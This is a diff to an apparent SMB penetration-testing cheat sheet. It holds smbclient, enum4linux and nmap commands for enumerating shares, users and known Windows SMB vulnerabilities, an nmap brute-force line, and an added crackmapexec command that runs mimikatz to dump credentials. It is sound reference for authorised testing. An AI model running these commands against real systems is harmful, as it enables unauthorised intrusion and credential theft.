@@ -10,29 +10,29 @@ echo exit | smbclient -L \\\\<target>\\
 # List shares on a machine using NULL Session
 smbclient -L <target>
 
-# List shares on a machine using a valid <username> + password
-smbclient -L <target> -U <username>%password
+# List shares on a machine using a valid <username> + <password>
+smbclient -L <target> -U <username>%<password>
 
-# Connect to a valid share with <username> + password
-smbclient //<target>/<share> -U <username>%password
+# Connect to a valid share with <username> + <password>
+smbclient //<target>/<share> -U <username>%<password>
 
 # List files on a specific share
-smbclient //<target>/<share> -c 'ls' password -U <username>
+smbclient //<target>/<share> -c 'ls' <password> -U <username>
 
 # List files on a specific share folder inside the share
-smbclient //<target>/<share> -c 'cd folder; ls' password -U <username>
+smbclient //<target>/<share> -c 'cd <folder>; ls' <password> -U <username>
 
 # Download a file from a specific share folder
-smbclient //<target>/<share> -c 'cd folder;get desired_file_name' password -U <username>
+smbclient //<target>/<share> -c 'cd <folder>;get <desired_file_name>' <password> -U <username>
 
 # Copy a file to a specific share folder
-smbclient //<target>/<share> -c 'put /var/www/my_local_file.txt .\target_folder\target_file.txt' password -U <username>
+smbclient //<target>/<share> -c 'put <attacker file> .\<remote file with backslashes>' <password> -U <username>
 
 # Create a folder in a specific share folder
-smbclient //<target>/<share> -c 'mkdir .\target_folder\new_folder' password -U <username>
+smbclient //<target>/<share> -c 'mkdir .\<remote folder with backslashes>' <password> -U <username>
 
 # Rename a file in a specific share folder
-smbclient //<target>/<share> -c 'rename current_file.txt new_file.txt' password -U <username>
+smbclient //<target>/<share> -c 'rename <current file> <new file>' <password> -U <username>
 
 # enum4linux - General enumeration - anonymous session 
 enum4linux -a <target>
@@ -53,9 +53,9 @@ enum4linux -u <username> -p <password> -P <target>
 nmap -p 445 --script smb-enum-users <target> --script-args smbuser=<username>,smbpass=<password>,smbdomain=<smbdomain>
 nmap -p 445 --script smb-enum-users <target> --script-args smbuser=<username>,smbhash=<lm:ntlm>,smbdomain=<smbdomain>
 
-nmap --script smb-enum-users.nse --script-args smb<username>=User1,smbpass=Pass@1234,smbdomain=workstation -p445 <target>
+nmap --script smb-enum-users.nse --script-args smbusername=<smbusername>,smbpass=<password>,smbdomain=workstation -p445 <target>
 
-nmap --script smb-enum-users.nse --script-args smb<username>=User1,smbhash=<lm:ntlm>,smbdomain=<smbdomain> -p445 <target>
+nmap --script smb-enum-users.nse --script-args smbusername=<smbusername>,smbhash=<lm:ntlm>,smbdomain=<smbdomain> -p445 <target>
 
 # nmap - Enum Groups
 nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=<username>,smbpass=<password>,smbdomain=<smbdomain>
@@ -65,22 +65,23 @@ nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=<username>,s
 nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=<username>,smbpass=<password>,smbdomain=<smbdomain>
 nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=<username>,smbpass=<lm:ntlm>,smbdomain=<smbdomain>
 
-# nmap - OS Discovery
-nmap -p 445 --script smb-os-discovery <target>
+### nmap - OS Discovery
+## nmap -p 445 --script smb-os-discovery <target>
 
-# nmap - SMB Vulnerabilities on Windows
-nmap -p 445 --script smb-vuln-ms06-025 <target> 
-nmap -p 445 --script smb-vuln-ms07-029 <target> 
-nmap -p 445 --script smb-vuln-ms08-067 <target> 
-nmap -p 445 --script smb-vuln-ms10-054 <target> 
-nmap -p 445 --script smb-vuln-ms10-061 <target> 
-nmap -p 445 --script smb-vuln-ms17-010 <target> 
+### nmap - SMB Vulnerabilities on Windows
+## nmap -p 445 --script smb-vuln-ms06-025 <target> 
+## nmap -p 445 --script smb-vuln-ms07-029 <target> 
+## nmap -p 445 --script smb-vuln-ms08-067 <target> 
+## nmap -p 445 --script smb-vuln-ms10-054 <target> 
+## nmap -p 445 --script smb-vuln-ms10-061 <target> 
+## nmap -p 445 --script smb-vuln-ms17-010 <target> 
 
 # nmap - SMB all vulns windows:
-
 nmap -p 445 --script smb-vuln-ms06-025 --script smb-vuln-ms07-029 --script smb-vuln-ms08-067 --script smb-vuln-ms10-054 --script smb-vuln-ms10-061 --script smb-vuln-ms17-010 <target>
 
 # map - Brute Force Accounts (be aware of account lockout!)
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt <target>
+
+crackmapexec smb <target> -u <> -p 'P@ssw0rd' -M mimikatz
 
 $ target: if [[ ! -z $target ]]; then; echo $target; else echo ""; fi
